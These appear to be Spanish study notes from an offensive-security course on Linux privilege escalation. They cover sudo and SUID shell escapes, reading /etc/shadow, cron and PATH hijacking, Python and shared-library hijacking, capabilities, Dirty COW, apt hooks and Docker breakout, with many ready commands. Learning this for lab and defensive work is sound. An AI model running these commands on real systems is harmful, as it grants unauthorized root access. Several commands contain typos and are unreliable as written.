# Escalada de privilegios en linux

Para hacer una enumeración del sistema para escalar privilegios de manera automática

https://github.com/diego-treitos/linux-smart-enumeration

para ejecutar el script

```
./lse.sh
```

en el caso de que lo que acceso representado con "yes" puedes mostrarlo con el parametro -l 2

otra opcion https://github.com/rebootuser/LinEnum pero es algo más antiguo

https://gtfobins.github.io

https://book.hacktricks.xyz

para hacerlo de forma manual

```
whoami
```

```
id
```

### Archivos y Directorios Sensibles

```bash
ls -l ~/.ssh # Lista el contenido del servicio SSH.
ls -l /tmp /var/tmp /dev/shm # Buscar archivos temporales.
find / -perm -4000 2>/dev/null # Buscar archivos con binarios SUID.
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null # Buscar archivos con binarios SUID.
find / -perm -2000 2>/dev/null # Archivos SGID.
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # Búsqueda de archivos de historial
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # Buscar archivos grabables.
find / type -f -name "*.conf" 2>/dev/null # Archivos de configuración.
find / -type d -name ".*" -ls 2>/dev/null # Buscar directorios ocultos.
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <username> # Buscar archivos ocultos.
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # Directorios escribibles.
find / -writable -type d 2>/dev/null # Directorios escribibles.
find / -writeable 2>/dev/null #archivos en los que se puede escribir
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # Buscar binarios .sh
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # Enumeración de servicios y componentes internos de Linux
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done # Comprobar en GTFOBINS
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD' # credenciales de la base de datos MySQL dentro de los archivos de configuración de WordPress
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null # .config en proc y mail,
sudo -l # Busca binarios que podamos utilizar como el usuario con máximos privilegios (root).
```

### Procesos y Servicios

```bash
ps au # Procesos en ejecución.
ps aux | grep root # Ver que procesos está ejecutando root.
top # Procesos en tiempo real.
service --status-all # Estado de servicios.
systemctl list-units # Unidades sustemd activas.
systemctl list-timers # te permite listar cuanto tiempo falta para que se ejecute cierta tarea
```

con la herramienta pspy puedes ver que comandos se estan ejecutando en el sistema y por que usuarios estan siendo ejecutados a tiempo real (en realease pspy64 en la pagina web de la herramienta)

para hacerlo de forma manual:

!\[\[Pasted image 20251006001751.png]]

diff te lista las diferencias entre un comando y otro > para nuevas cosas que aparezcan entre ambos comandos y < para que te muestre las que son iguales al anterior comando

### Logs y Auditoría

```
cat /var/log/auth.log # Logs de autenticación.
cat /var/log/syslog # Logs del sistema.
last # Últimos inicios de sesión.
```

### SUDOERS

```
/etc/sudoers
```

utilidad que nos permite ejecutar programas con los privilegios de otros usuarios de manera segura

por ejemplo con awk desde un usuario que no es root podriamos ejecutar comandos mediante:

```
sudo awk ' BEGIN {system("/bin/bash")}
```

otro ejemplo con nmap:

desde la carpeta /tmp porque solemos tener permiso de escritura con todos los usuarios creamos un usuario

```
'os.execute("/bin/bash")' > script.nse
```

sudo nmap nmap --script=/tmp/script.nse

### SUID

```
find / -perm -4000 -ls 2>/dev/null
```

permite ejecutar un comando como el propietario de ese ejecutable de manera temporal

cuando un comando tiene un privilegio suid afecta para todos los usuarios del sistema a diferencia de sudo

por ejemplo base64:

```
base64 /etc/shadow -w 0 | base64 -d
```

-w 0: para leerlos todos en una misma linea

nos permitiría leer las contraseñas cifradas

otro ejemplo con php

```
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

### Tareas Cron

```bash
ctrontab -l # Tareas cron del usuario actual.
ls -la /etc/cron.daily/
ls -la /etc/cron* # Archivos cron del sistema.
cat /etc/crontab  # Configuración cron del sistema.
```

ps -eo user,command: comandos que se estan ejecutando en el sistema (comando y usuario)

con un bluce infinito hacemos la diferencia entre los comandos antiguos y el comando nuevo a ver si vemos alguna diferencia

```
#!/bin/bash
old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new-process") | grep "[\>\<]" | grep -v "procmon|command|kworker"
	old_process=$new_process
done
```

vemos que se ejecuta un comando como el usuario root el cual tiene malos permisos configurados y nos permite modificar ese archivo. Si nosotros por ejemplo le ponemops a ese archivo el comando chmod u+s /bin/bash

posteriormente haciendo

```
bash -p
```

como el propietario es root, nos daría una bash con el usuario root

imaginemos que se ejecuta una tarea cron en nuestro directorio de trabajo, en el caso de que root ejecute esa tarea, al nosotros tener permisos en nuestro directorio, podemos borrar el archivo y crear otros con lo que nosotros queramos (por ejemplo ponerle permisos suid a la /bin/bash)

### Path hijacking

la variable de entorno echo $PATH es desde donde podemos ejecutar comandos sin poner la ruta absoluta del mismo

pero esto lo podriamos editar:

```
export PATH=/tmp/:$PATH
```

ahora el comando que hemos visto que se esta corriendo mediante root en una ruta relativa. creamos un comando en la ruta /tmp que hemos añadido y esto nos permite ejecutar el comando como root. por ejemplo en la carpeta /tmp creamos un comando whoami:

```
bash -p
```

### Python library hijacking

```
python3 -c 'import sys; print(sys.path)'
```

de esta manera si nos listaría las librerias de python disponibles

supongamos que hay un archivo que ejecuta otro usuario para el cual no tenemos permisos de ejecucion pero si tenemos permiso para ejecutar como ese usuario python3

supongamos que el archivo que ejecuta ese usuario hace un import de una librería, esa libreria es buscada en el path de python con el comando que vemos arriba, si nosotros hacemos uso de python library hijacking y creamos una librería con ese mismo nombre en la carpeta actual de trabajo, (es la primera donde busca python) entonces podemos hacer que esa librería importe os y nos permitiria ejecutar comandos en el sistema.

python al igual que el $PATH de linux busca de izquierda a derecha si encuentra el comando que nosotros proporcionamos, en el caso de tener permitido escritura en uno de los path de python antes de que encuentre la carpeta en otro (de izq a derecha) entonces podríamos hacaer esto mismo

de la misma manera si el propietario es root y nosotros tenemos permiso de escritura en la libreria donde se encuentra el import podemos alterar lo que esa libreria hace y podemos tener una consola interactiva importando os de tal manera que ganariamos acceso como la persona que ejecuta el archivo

```
os.system("bash -p")
```

### permisos mal implementados

```
openssl passwd 
```

y proporcionamos una contraseña, nos la hardcodeará con el formato de passwd y si la añadimos en el usuario root por ejemplo (imagina que otros tienen permisos de escritura en el passwd )

```
find / -writeable 2>/dev/null
```

### capabilities

```
getcap -r / 2>/dev/null
```

listar los pid procesos que esten actualmente activos:

```
ls /proc
```

```
getpcaps <pid>
```

te muestra las capabilities para ese proceso

una de las que tiene mas riesgo cap\_setuid+ep que nos permite proporcionar un uid

```
python3 -c 'import os; os.setuid(0); os.system("bash")'
```

### Explotación del kernel

[https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

* linux exploit suggester github

```
uname -a 
```

podemos explotar el kernel con versiones entre 2.6.22 hasta 3.2 si buscamos en searchsploit con dirty cow es lo que vamos a explotar

PTRACE\_PKEDATA race condition es lo que vamos a explotar

miramos con which gcc si podemos compilar el script que esta programado para escalar privilegios (el dirty cow)

searchsploit -m linux/local/40839.c para mover el script al directorio actual de traabajo

normalmente en estos scripts te dicen como compilar el script, podemos hacer con grep gcc

### grupos especiales

si un usuario pertenece al grupo de docker, jugando con montur as podriamos montar toda la raiz del host en docker

```
docker run --rm  -dit -v /:/mnt/root --name privesc
```

y por ejemplo, como es una montura, dentro del contenedor nos vamos a /mnt/root/bin y hacemos chmod +s bash tambien se cambiaría en nuestro sistema host

el grupo adm nos permite leer los logs del sistema

```
/var/logs
```

para eliminar un usuario de un grupo gpassd -d gopal grupo

tambien se puede hacer con lxd la escalada de privs

```
searchsploit lxd
```

### abuso servicios internos del sistema

imaginamos que dentro de la maquina con la cual hemos ganado una webshell, esta en localhost corriendo un servicio como root, en ese caso, podemos ganar una terminal interactiva porque podemos hacer un curl desde la propia maquina con lo cual resolverá el localhost

suponiendo que tenemos permisos de escritura en apt.conf.d podemos definir que comando previo queremos que se ejecute previo a la actualización del sistema

!\[\[Pasted image 20251012183247.png]]

```
APT::Update::Pre-invoke {"chmod u+s /bin/bash"}
```

en apt.conf.d metemos un archivo que se llamae 01privesc

### Abuso de binarios específicos

* **Máquina Pluck de Vulnhub**: [https://www.vulnhub.com/entry/pluck-1,178/](https://www.vulnhub.com/entry/pluck-1,178/)

Por otro lado, os compartimos el enlace directo de descarga para Ubuntu 16.04.7 LTS (Xenial Xerus):

* **Ubuntu 16.04.7**: [https://releases.ubuntu.com/16.04/](https://releases.ubuntu.com/16.04/)

Por último, se os comparte el enlace de descarga al binario el cual estaremos explotando para este segundo caso. Este binario es necesario que lo depositéis en alguna ruta del sistema y que le otorguéis de permisos de ejecución:

* **Binario** **CUSTOM**: [https://hack4u.io/wp-content/uploads/2023/04/custom](https://hack4u.io/wp-content/uploads/2023/04/custom) (QUITADLE LA EXTENSIÓN TXT UNA VEZ DESCARGADO)

El primer ejemplo se enfoca en explotar el binario legítimo **exim-4.84-7**, que presenta una vulnerabilidad identificada como **CVE-2016-1531**. Esta vulnerabilidad permite a un atacante ejecutar comandos privilegiados mediante el abuso de ciertas variables de entorno. Estudiaremos cómo aprovechar esta vulnerabilidad para escalar privilegios y acceder a funciones restringidas.

El segundo ejemplo aborda un **Buffer Overflow** en un binario personalizado en una máquina **Linux** de **32 bits** con **protecciones activas** y **ASLR** habilitado. En este caso, nos centraremos en explotar un **ret2libc** en un binario que posee permisos SUID y cuyo propietario es root. A través del buffer overflow, demostraremos cómo inyectar comandos privilegiados y, en consecuencia, elevar los privilegios de usuario.

## Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente

!\[\[Pasted image 20251013164832.png]]

Las **bibliotecas compartidas** son archivos que contienen funciones y recursos utilizados por múltiples programas. Cuando un programa requiere una función de una biblioteca compartida, el sistema operativo busca la biblioteca y enlaza dinámicamente la función requerida durante la ejecución del programa. Sin embargo, si el sistema no encuentra la biblioteca en las rutas predeterminadas, puede buscarla en otros directorios.

Un atacante puede aprovechar esta situación creando una **biblioteca compartida maliciosa** con el mismo nombre que la biblioteca legítima y colocándola en un directorio donde el sistema la buscará. Cuando el programa intenta cargar la biblioteca, el sistema cargará la versión maliciosa en lugar de la legítima, permitiendo al atacante ejecutar código malicioso con los privilegios del programa víctima.

En esta clase, analizaremos cómo se lleva a cabo el secuestro de bibliotecas de objetos compartidos enlazados dinámicamente y cómo identificar situaciones en las que esta técnica puede ser aplicada.

A continuación, se os comparte una de las herramientas que utilizamos en esta clase para analizar la ejecución de un programa escrito en C/C++:

* **Herramienta Uftrace**: [https://github.com/namhyung/uftrace](https://github.com/namhyung/uftrace)

Asimismo, se os comparte el enlace directo a la plataforma **AttackDefense**, donde estaremos resolviendo un reto que involucra esta misma temática:

* **AttackDefense**: [https://attackdefense.com](https://attackdefense.com/)

### Docker breakout

En la clase actual, exploraremos diversas técnicas para abusar de **Docker** con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host. Examinaremos situaciones específicas y discutiremos las implicaciones de seguridad en cada caso.

Las técnicas que se tratarán en esta clase incluyen:

* Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host. Analizaremos cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
* Despliegue de contenedores con la compartición de procesos (**–pid=host**) y permisos privilegiados (**–privileged**). Veremos cómo inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema.
* Uso de **Portainer** para administrar el despliegue de un contenedor. Discutiremos cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
* Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinaremos cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.

Al finalizar esta clase, comprenderás las vulnerabilidades potenciales asociadas con Docker y aprenderás a identificar los posibles riesgos de seguridad en entornos basados en contenedores.
